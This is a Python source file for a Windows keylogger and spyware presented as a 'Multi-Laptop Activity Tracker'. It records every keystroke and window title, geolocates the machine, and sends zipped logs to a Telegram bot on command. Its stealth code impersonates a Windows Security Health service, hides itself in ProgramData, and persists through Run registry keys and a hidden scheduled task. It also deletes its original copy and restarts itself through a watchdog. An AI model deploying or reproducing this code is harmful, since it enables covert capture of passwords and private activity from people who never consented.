from pynput import keyboard
from datetime import datetime
import threading
import time
import platform
import socket
import os
import sys
import logging
import zipfile
import requests
import json
import geocoder
import shutil
import subprocess
import win32gui
import win32process
import psutil
from telegram import Update
from telegram.ext import Application, CommandHandler, ContextTypes
TELEGRAM_BOT_TOKEN = "xxxx"
YOUR_TELEGRAM_CHAT_ID = "xxxx"
OPENCAGE_API_KEY = "xxxx"
LOCATIONIQ_API_KEY = "xxxx"
ENABLE_STEALTH_MODE = True
def setup_logging():
    log_dir = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), '.syslog')
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, 'system.log')
    logging.basicConfig(
        filename=log_file,
        format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
        level=logging.INFO
    )
setup_logging()
STEALTH_CONFIG = {
    'process': 'WindowsSecurityHealthService.exe',
    'folder': 'Microsoft\\Windows\\Security\\HealthCheck',
    'service': 'Windows Security Health Service',
    'registry_key': 'SecurityHealthService'
}
def check_if_running_stealth():
    current_path = sys.executable if getattr(sys, 'frozen', False) else __file__
    return STEALTH_CONFIG['folder'] in current_path
DEVICE_HOSTNAME = None
DEVICE_INFO_CACHE = None
def get_device_name():
    global DEVICE_HOSTNAME
    if DEVICE_HOSTNAME is None:
        try:
            hostname = socket.gethostname()
            DEVICE_HOSTNAME = hostname.replace('.local', '').replace('.lan', '')
        except:
            DEVICE_HOSTNAME = "Unknown Device"
    return DEVICE_HOSTNAME
def get_device_info():
    global DEVICE_INFO_CACHE
    if DEVICE_INFO_CACHE is None:
        try:
            hostname = get_device_name()
            release = platform.release()
            try:
                edition = platform.win32_edition() if hasattr(platform, 'win32_edition') else ""
                full_system = f"Windows {release} {edition}".strip()
            except:
                full_system = f"Windows {release}"
            DEVICE_INFO_CACHE = f"{hostname} ({full_system})"
        except:
            DEVICE_INFO_CACHE = "Unknown Device"
    return DEVICE_INFO_CACHE
def get_location_data():
    location_info = {
        'latitude': None,
        'longitude': None,
        'address': None,
        'ip_address': None,
        'method': None
    }
    try:
        g = geocoder.ip('me')
        if g.ok:
            location_info['latitude'] = g.lat
            location_info['longitude'] = g.lng
            location_info['address'] = g.address
            location_info['ip_address'] = g.ip
            location_info['method'] = 'IP Geolocation'
            if location_info['latitude'] and location_info['longitude']:
                better_address = get_address_from_coords(location_info['latitude'], 
                                                         location_info['longitude'])
                if better_address and better_address != "Address not available":
                    location_info['address'] = better_address
            return location_info
    except Exception as e:
        logging.error(f"IP geolocation failed: {e}")
    return location_info
def get_address_from_coords(lat, lng):
    session = requests.Session()
    session.headers.update({'User-Agent': 'LaptopTracker/1.0'})
    if OPENCAGE_API_KEY:
        try:
            url = f"https://api.opencagedata.com/geocode/v1/json?q={lat}+{lng}&key={OPENCAGE_API_KEY}"
            response = session.get(url, timeout=5)
            if response.status_code == 200:
                results = response.json().get('results', [])
                if results and results[0].get('formatted'):
                    return results[0]['formatted']
        except Exception as e:
            logging.error(f"OpenCage geocoding failed: {e}")
    if LOCATIONIQ_API_KEY:
        try:
            url = f"https://us1.locationiq.com/v1/reverse.php?key={LOCATIONIQ_API_KEY}&lat={lat}&lon={lng}&format=json"
            response = session.get(url, timeout=5)
            if response.status_code == 200:
                data = response.json()
                if data.get('display_name'):
                    return data['display_name']
        except Exception as e:
            logging.error(f"LocationIQ geocoding failed: {e}")
    try:
        url = f"https://nominatim.openstreetmap.org/reverse?format=json&lat={lat}&lon={lng}"
        response = session.get(url, timeout=5)
        if response.status_code == 200:
            data = response.json()
            if data.get('display_name'):
                return data['display_name']
    except Exception as e:
        logging.error(f"Nominatim geocoding failed: {e}")
    return "Address not available"
class ActivityLogger:
    def __init__(self):
        if getattr(sys, 'frozen', False):
            base_dir = os.path.dirname(sys.executable)
        else:
            base_dir = os.path.dirname(os.path.abspath(__file__))
        self.log_dir = os.path.join(base_dir, "activity_logs")
        os.makedirs(self.log_dir, exist_ok=True)
        self.keystroke_buffer = []
        self.device_name = get_device_name()
        self.date_str = datetime.now().strftime('%Y%m%d')
        self.keystroke_file = os.path.join(self.log_dir, 
                                          f"{self.device_name}_keystrokes_{self.date_str}.txt")
        self.activity_file = os.path.join(self.log_dir, 
                                         f"{self.device_name}_app_usage_{self.date_str}.txt")
        self.status_file = os.path.join(self.log_dir, f"{self.device_name}_status.txt")
        self.key_log = None
        self.app_log = None
        self._open_log_files()
        self.current_app = None
        self.current_window = None
        self.app_start_time = None
        self.running = True
        self.last_save_time = time.time()
        self.save_interval = 30
        self.keystroke_buffer = []
        self.buffer_size_limit = 100
        self.total_keystrokes = 0
        self.app_switches = 0
        self.start_time = datetime.now()
        self.is_compressing = False
    def _open_log_files(self):
        try:
            keystroke_exists = os.path.exists(self.keystroke_file)
            activity_exists = os.path.exists(self.activity_file)
            self.key_log = open(self.keystroke_file, 'a', encoding='utf-8', buffering=1)
            self.app_log = open(self.activity_file, 'a', encoding='utf-8', buffering=1)
            if not keystroke_exists:
                self._write_keystroke_header()
            else:
                self.key_log.write(f"\n\n[SESSION RESUMED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            if not activity_exists:
                self._write_activity_header()
            else:
                self.app_log.write(f"\n[SESSION RESUMED: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}]\n")
            self._flush_logs()
        except Exception as e:
            logging.error(f"Error opening log files: {e}")
            raise
    def _write_keystroke_header(self):
        self.key_log.write("=" * 70 + "\n")
        self.key_log.write(f"KEYSTROKE LOG - Device: {self.device_name}\n")
        self.key_log.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.key_log.write("=" * 70 + "\n\n")
    def _write_activity_header(self):
        self.app_log.write("=" * 70 + "\n")
        self.app_log.write(f"APPLICATION USAGE LOG - Device: {self.device_name}\n")
        self.app_log.write(f"Started: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        self.app_log.write("=" * 70 + "\n\n")
        self.app_log.write(f"{'Timestamp':<20} | {'Duration':<12} | {'Application':<25} | Window Title\n")
        self.app_log.write("-" * 70 + "\n")
    def _flush_logs(self):
        try:
            if self.keystroke_buffer:
                self.key_log.write(''.join(self.keystroke_buffer))
                self.keystroke_buffer = []
            self.key_log.flush()
            os.fsync(self.key_log.fileno())
            self.app_log.flush()
            os.fsync(self.app_log.fileno())
        except Exception as e:
            logging.error(f"Error flushing logs: {e}")
    def _update_status_file(self):
        try:
            uptime = datetime.now() - self.start_time
            with open(self.status_file, 'w', encoding='utf-8') as f:
                f.write(f"Activity Logger Status - {self.device_name}\n")
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 50 + "\n")
                f.write(f"Status: RUNNING\n")
                f.write(f"Uptime: {str(uptime).split('.')[0]}\n")
                f.write(f"Total Keystrokes: {self.total_keystrokes}\n")
                f.write(f"App Switches: {self.app_switches}\n")
                f.write(f"Current App: {self.current_app or 'None'}\n")
                f.write(f"Keystroke Log: {self.keystroke_file}\n")
                f.write(f"Activity Log: {self.activity_file}\n")
        except Exception as e:
            logging.error(f"Error updating status: {e}")
    def _check_date_rollover(self):
        current_date = datetime.now().strftime('%Y%m%d')
        if current_date != self.date_str:
            try:
                self.key_log.close()
                self.app_log.close()
                self.date_str = current_date
                self.keystroke_file = os.path.join(self.log_dir, 
                                                  f"{self.device_name}_keystrokes_{self.date_str}.txt")
                self.activity_file = os.path.join(self.log_dir, 
                                                 f"{self.device_name}_app_usage_{self.date_str}.txt")
                self._open_log_files()
                logging.info(f"Date rollover: new log files created for {current_date}")
            except Exception as e:
                logging.error(f"Error during date rollover: {e}")
    def compress_logs(self, all_logs=False):
        if self.is_compressing:
            return None
        self.is_compressing = True
        try:
            self._flush_logs()
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            zip_filename = os.path.join(self.log_dir, 
                                       f"{self.device_name}_logs_{timestamp}.zip")
            with zipfile.ZipFile(zip_filename, 'w', zipfile.ZIP_DEFLATED) as zipf:
                if all_logs:
                    for filename in os.listdir(self.log_dir):
                        if filename.startswith(self.device_name) and filename.endswith('.txt'):
                            file_path = os.path.join(self.log_dir, filename)
                            zipf.write(file_path, filename)
                else:
                    zipf.write(self.keystroke_file, os.path.basename(self.keystroke_file))
                    zipf.write(self.activity_file, os.path.basename(self.activity_file))
                    zipf.write(self.status_file, os.path.basename(self.status_file))
            self.is_compressing = False
            return zip_filename
        except Exception as e:
            logging.error(f"Error compressing logs: {e}")
            self.is_compressing = False
            return None
    def get_active_window_info(self):
        try:
            hwnd = win32gui.GetForegroundWindow()
            window_title = win32gui.GetWindowText(hwnd)
            _, pid = win32process.GetWindowThreadProcessId(hwnd)
            try:
                process = psutil.Process(pid)
                process_name = process.name()
            except:
                process_name = "Unknown"
            return process_name, window_title
        except Exception as e:
            logging.error(f"Error getting window info: {e}")
            return None, None
    def track_app_usage(self):
        while self.running:
            try:
                app_name, window_title = self.get_active_window_info()
                if app_name and (app_name != self.current_app or window_title != self.current_window):
                    if self.current_app and self.app_start_time:
                        duration = datetime.now() - self.app_start_time
                        duration_str = str(duration).split('.')[0]
                        log_entry = f"{self.app_start_time.strftime('%Y-%m-%d %H:%M:%S'):<20} | "
                        log_entry += f"{duration_str:<12} | {self.current_app:<25} | {self.current_window}\n"
                        self.app_log.write(log_entry)
                    self.current_app = app_name
                    self.current_window = window_title
                    self.app_start_time = datetime.now()
                    self.app_switches += 1
                    self.keystroke_buffer.append(
                        f"\n[APP: {app_name} - {window_title} @ {datetime.now().strftime('%H:%M:%S')}]\n"
                    )
                current_time = time.time()
                if current_time - self.last_save_time >= self.save_interval:
                    self._flush_logs()
                    self._update_status_file()
                    self._check_date_rollover()
                    self.last_save_time = current_time
                time.sleep(1)
            except Exception as e:
                logging.error(f"Error in app tracking: {e}")
                time.sleep(1)
    def on_press(self, key):
        try:
            self.total_keystrokes += 1
            if hasattr(key, 'char') and key.char:
                self.keystroke_buffer.append(key.char)
            else:
                if key == keyboard.Key.space:
                    self.keystroke_buffer.append(' ')
                elif key == keyboard.Key.enter:
                    self.keystroke_buffer.append('\n')
                elif key == keyboard.Key.tab:
                    self.keystroke_buffer.append('\t')
                elif key == keyboard.Key.backspace:
                    self.keystroke_buffer.append('[BKSP]')
                else:
                    key_name = str(key).replace('Key.', '').upper()
                    self.keystroke_buffer.append(f'[{key_name}]')
            if len(self.keystroke_buffer) >= self.buffer_size_limit:
                self._flush_logs()
        except Exception as e:
            logging.error(f"Error logging keypress: {e}")
    def on_release(self, key):
        return True  # Never stop on key release
    def shutdown(self):
        try:
            logging.info(f"Shutting down logger for {self.device_name}")
            if self.current_app and self.app_start_time:
                duration = datetime.now() - self.app_start_time
                duration_str = str(duration).split('.')[0]
                log_entry = f"{self.app_start_time.strftime('%Y-%m-%d %H:%M:%S'):<20} | "
                log_entry += f"{duration_str:<12} | {self.current_app:<25} | {self.current_window}\n"
                self.app_log.write(log_entry)
            self._flush_logs()
            self.key_log.write("\n\n" + "=" * 70 + "\n")
            self.key_log.write(f"Session Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            self.key_log.write("=" * 70 + "\n")
            self.app_log.write("\n" + "=" * 70 + "\n")
            self.app_log.write(f"Session Ended: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            self.app_log.write("=" * 70 + "\n")
            self.key_log.close()
            self.app_log.close()
            with open(self.status_file, 'w', encoding='utf-8') as f:
                f.write(f"Logger Status - {self.device_name}\n")
                f.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 50 + "\n")
                f.write(f"Status: STOPPED\n")
                f.write(f"Total Runtime: {str(datetime.now() - self.start_time).split('.')[0]}\n")
                f.write(f"Total Keystrokes: {self.total_keystrokes}\n")
                f.write(f"App Switches: {self.app_switches}\n")
            logging.info(f"Logger stopped for {self.device_name}")
        except Exception as e:
            logging.error(f"Error during shutdown: {e}")
    def start(self):
        try:
            logging.info(f"Activity logger started for {self.device_name}")
            app_thread = threading.Thread(target=self.track_app_usage, daemon=True)
            app_thread.start()
            self._update_status_file()
            with keyboard.Listener(
                on_press=self.on_press,
                on_release=self.on_release
            ) as listener:
                listener.join()
            self.shutdown()
        except Exception as e:
            logging.error(f"Fatal error in activity logger: {e}")
activity_logger = None
def start_activity_logger():
    global activity_logger
    try:
        activity_logger = ActivityLogger()
        logger_thread = threading.Thread(target=activity_logger.start, daemon=True)
        logger_thread.start()
        logging.info("Activity logger thread started")
    except Exception as e:
        logging.error(f"Failed to start activity logger: {e}")
async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    device_name = get_device_name()
    await update.message.reply_text(
        f" Multi-Laptop Activity Tracker\n"
        f"Device: {device_name}\n\n"
        f" Location Commands:\n"
        f"/location - Get device location\n"
        f"/info - Get device information\n\n"
        f" Activity Commands:\n"
        f"/status - Activity logger status\n"
        f"/logs - Get today's activity logs (zip)\n"
        f"/alllogs - Get all activity logs (zip)\n\n"
        f"/help - Show this message"
    )
async def location_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != YOUR_TELEGRAM_CHAT_ID:
        await update.message.reply_text(" Unauthorized access")
        logging.warning(f"Unauthorized location request from chat_id: {update.effective_chat.id}")
        return
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    device_name = get_device_name()
    await update.message.reply_text(f" Locating {device_name}...")
    location_data = get_location_data()
    device_info = get_device_info()
    if location_data['latitude'] and location_data['longitude']:
        await update.message.reply_location(
            latitude=location_data['latitude'],
            longitude=location_data['longitude']
        )
        google_maps_link = f"https://www.google.com/maps?q={location_data['latitude']},{location_data['longitude']}"
        message = (
            f" Device Located\n\n"
            f"🖥 {device_name}\n"
            f" System: {device_info}\n"
            f" Method: {location_data['method']}\n"
            f"🌐 Coordinates: {location_data['latitude']}, {location_data['longitude']}\n"
            f" Address: {location_data['address'] or 'Not available'}\n"
            f" IP: {location_data['ip_address'] or 'Not available'}\n\n"
            f" Google Maps: {google_maps_link}"
        )
        await update.message.reply_text(message)
        logging.info(f"Location sent for {device_name}")
    else:
        await update.message.reply_text(
            f" Unable to determine location for {device_name}\n"
            f"Device: {device_info}\n\n"
            "The device may not have internet access or location services are unavailable."
        )
        logging.warning(f"Location unavailable for {device_name}")
async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != YOUR_TELEGRAM_CHAT_ID:
        await update.message.reply_text(" Unauthorized access")
        return
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    device_name = get_device_name()
    device_info = get_device_info()
    try:
        ip = requests.get('https://api.ipify.org', timeout=5).text
    except:
        ip = "Unable to fetch"
    message = (
        f" Device Information\n\n"
        f"🖥 {device_name}\n"
        f" System: {device_info}\n"
        f" Public IP: {ip}\n"
        f" Status: Online"
    )
    await update.message.reply_text(message)
    logging.info(f"Info sent for {device_name}")
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != YOUR_TELEGRAM_CHAT_ID:
        await update.message.reply_text(" Unauthorized access")
        return
    global activity_logger
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    device_name = get_device_name()
    if activity_logger:
        uptime = datetime.now() - activity_logger.start_time
        status_msg = (
            f" Activity Logger Status\n"
            f"Device: {device_name}\n\n"
            f" Running\n"
            f" Uptime: {str(uptime).split('.')[0]}\n"
            f" Keystrokes: {activity_logger.total_keystrokes:,}\n"
            f" App switches: {activity_logger.app_switches}\n"
            f" Current app: {activity_logger.current_app or 'None'}\n"
            f"\nUse /logs to get today's logs\nUse /alllogs to get all logs"
        )
        await update.message.reply_text(status_msg)
    else:
        await update.message.reply_text(f" Activity logger not running on {device_name}")
async def logs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != YOUR_TELEGRAM_CHAT_ID:
        await update.message.reply_text(" Unauthorized access")
        return
    global activity_logger
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    device_name = get_device_name()
    if not activity_logger:
        await update.message.reply_text(f" Activity logger not running on {device_name}")
        return
    await update.message.reply_text(f" Compressing today's logs from {device_name}...")
    zip_file = activity_logger.compress_logs(all_logs=False)
    if zip_file:
        try:
            size_mb = os.path.getsize(zip_file) / (1024 * 1024)
            with open(zip_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=os.path.basename(zip_file),
                    caption=f" Today's logs from {device_name}\n"
                           f"Size: {size_mb:.2f} MB\n"
                           f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            os.remove(zip_file)
            await update.message.reply_text(" Logs sent successfully!")
            logging.info(f"Today's logs sent for {device_name}")
        except Exception as e:
            await update.message.reply_text(f" Error sending logs: {str(e)}")
            logging.error(f"Error sending logs: {e}")
    else:
        await update.message.reply_text(" Error compressing logs")
async def alllogs_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != YOUR_TELEGRAM_CHAT_ID:
        await update.message.reply_text(" Unauthorized access")
        return
    global activity_logger
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    device_name = get_device_name()
    if not activity_logger:
        await update.message.reply_text(f" Activity logger not running on {device_name}")
        return
    await update.message.reply_text(f" Compressing all logs from {device_name}... This may take a moment.")
    zip_file = activity_logger.compress_logs(all_logs=True)
    if zip_file:
        try:
            size_mb = os.path.getsize(zip_file) / (1024 * 1024)
            with open(zip_file, 'rb') as f:
                await update.message.reply_document(
                    document=f,
                    filename=os.path.basename(zip_file),
                    caption=f" All logs from {device_name}\n"
                           f"Size: {size_mb:.2f} MB\n"
                           f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
                )
            os.remove(zip_file)
            await update.message.reply_text(" All logs sent successfully!")
            logging.info(f"All logs sent for {device_name}")
        except Exception as e:
            await update.message.reply_text(f" Error sending logs: {str(e)}")
            logging.error(f"Error sending all logs: {e}")
    else:
        await update.message.reply_text(" Error compressing logs")
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start_command(update, context)
def setup_persistence(hidden_exe):
    try:
        import winreg
        registry_locations = [
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run"),
            (winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Explorer\StartupApproved\Run"),
        ]
        for hive, key_path in registry_locations:
            try:
                key = winreg.OpenKey(hive, key_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, STEALTH_CONFIG['registry_key'], 0, winreg.REG_SZ, f'"{hidden_exe}"')
                winreg.CloseKey(key)
            except:
                pass
    except ImportError:
        pass
    task_xml = f"""<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <Triggers>
    <LogonTrigger><Enabled>true</Enabled></LogonTrigger>
  </Triggers>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <Hidden>true</Hidden>
    <ExecutionTimeLimit>PT0S</ExecutionTimeLimit>
  </Settings>
  <Actions>
    <Exec><Command>{hidden_exe}</Command></Exec>
  </Actions>
</Task>"""
    system_drive = os.environ.get('SystemDrive', 'C:') + '\\'
    hidden_folder = os.path.join(system_drive, 'ProgramData', STEALTH_CONFIG['folder'])
    task_xml_path = os.path.join(hidden_folder, 'task.xml')
    try:
        with open(task_xml_path, 'w', encoding='utf-16') as f:
            f.write(task_xml)
        subprocess.run(['schtasks', '/Create', '/TN', STEALTH_CONFIG['service'], '/XML', task_xml_path, '/F'], 
                      capture_output=True, shell=True)
        os.remove(task_xml_path)
    except:
        pass
def install_stealth():
    if check_if_running_stealth():
        source_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        setup_persistence(source_path)
        return True
    source_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
    system_drive = os.environ.get('SystemDrive', 'C:') + '\\'
    hidden_folder = os.path.join(system_drive, 'ProgramData', STEALTH_CONFIG['folder'])
    hidden_exe = os.path.join(hidden_folder, STEALTH_CONFIG['process'])
    install_script = f"""@echo off
timeout /t 2 /nobreak >nul
taskkill /F /PID {os.getpid()}
if not exist "{hidden_folder}" mkdir "{hidden_folder}"
copy /Y "{source_path}" "{hidden_exe}"
attrib +H +S "{hidden_folder}"
attrib +H +S "{hidden_exe}"
start "" "{hidden_exe}"
:DEL_LOOP
del /f /q "{source_path}"
if exist "{source_path}" (
    timeout /t 1 /nobreak >nul
    goto DEL_LOOP
)
del /f /q "%~f0"
"""
    try:
        script_path = os.path.join(os.environ.get('TEMP', 'C:\\Windows\\Temp'), 'install_update.bat')
        with open(script_path, 'w') as f:
            f.write(install_script)
        logging.info(f"Starting background installation script: {script_path}")
        subprocess.Popen(script_path, shell=True, 
                       creationflags=subprocess.CREATE_NO_WINDOW if hasattr(subprocess, 'CREATE_NO_WINDOW') else 0)
        sys.exit(0)
    except Exception as e:
        logging.error(f"Stealth installation failed: {e}")
        return False
def run_watchdog():
    if len(sys.argv) > 1 and sys.argv[1] == '--worker':
        return False
    logging.info("Watchdog started")
    while True:
        try:
            if getattr(sys, 'frozen', False):
                executable = sys.executable
                args = [executable, '--worker']
            else:
                executable = sys.executable
                args = [executable, __file__, '--worker']
            worker = subprocess.Popen(args)
            logging.info(f"Worker started with PID: {worker.pid}")
            worker.wait()
            logging.warning("Worker exited, restarting in 1 second...")
            time.sleep(1)
        except Exception as e:
            logging.error(f"Watchdog error: {e}")
            time.sleep(5)
    return True
def main():
    if TELEGRAM_BOT_TOKEN == "YOUR_TELEGRAM_BOT_TOKEN_HERE":
        return
    if YOUR_TELEGRAM_CHAT_ID == "YOUR_CHAT_ID_HERE":
        return
    if ENABLE_STEALTH_MODE and not check_if_running_stealth():
        if install_stealth():
            time.sleep(3)
            sys.exit(0)
    if ENABLE_STEALTH_MODE and check_if_running_stealth():
        if run_watchdog():
            return
    device_name = get_device_name()
    if not check_if_running_stealth():
        print(f"Tracker running on {device_name}")
    logging.info(f"Tracker started on {device_name}")
    start_activity_logger()
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start_command))
    application.add_handler(CommandHandler("location", location_command))
    application.add_handler(CommandHandler("info", info_command))
    application.add_handler(CommandHandler("status", status_command))
    application.add_handler(CommandHandler("logs", logs_command))
    application.add_handler(CommandHandler("alllogs", alllogs_command))
    application.add_handler(CommandHandler("help", help_command))
    try:
        application.run_polling(allowed_updates=Update.ALL_TYPES)
    except KeyboardInterrupt:
        logging.info(f"Tracker stopped by user on {device_name}")
        if activity_logger:
            activity_logger.running = False
            activity_logger.shutdown()
    except Exception as e:
        logging.error(f"Bot error on {device_name}: {e}")
if __name__ == "__main__":
    main()
